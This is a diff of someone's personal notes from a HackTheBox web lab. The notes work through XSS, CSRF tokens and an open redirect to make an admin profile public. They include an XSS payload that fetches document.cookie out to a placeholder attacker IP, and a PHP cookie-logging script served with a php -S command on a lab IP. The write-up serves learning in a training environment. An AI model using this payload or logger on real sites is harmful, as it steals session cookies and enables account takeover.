@@ -477,7 +477,8 @@ We don't necessarily have to use the window.location() object that causes victim
 Find an example of such a payload below.
 
 ``` javascript
-<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>```
+<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
+```
 
 -----------------
 
@@ -1237,4 +1238,40 @@ So I think this using an admin user.
 Now how do I leverage the url redirect.
 
 Interestingly, the user agent in response above has [9226d9ef6c23951791871632a63a1681bda57e1d]
+
+Looks an awful lot like a csrf token its also hidden in the request on Burp. so feels like its important.
+
+Doing it multiple returns the same token too
+
+Not seeing anything else to steal here. Gonna run a page fuzz.
+
+The hint on the HTB says make the admins profile public to see the flag...
+
+Maybe I can Open Redirect to my page with the make public script embedded? Then visit that page?
+
+That seems to maybe have worked... but I don't know what the admin email is.
+
+Lets try another tactic.
+
+Lets host a cookie logging script locally, since I know I can connect locally.
+
+``` php
+<?php
+$logFile = "cookieLog.txt";
+$cookie = $_REQUEST["c"];
+
+$handle = fopen($logFile, "a");
+fwrite($handle, $cookie . "\n\n");
+fclose($handle);
+
+header("Location: http://www.google.com/");
+exit;
+?>
+```
+
+And host my php server with:
+
+`php -S 10.10.14.109:8000`
+
+
 
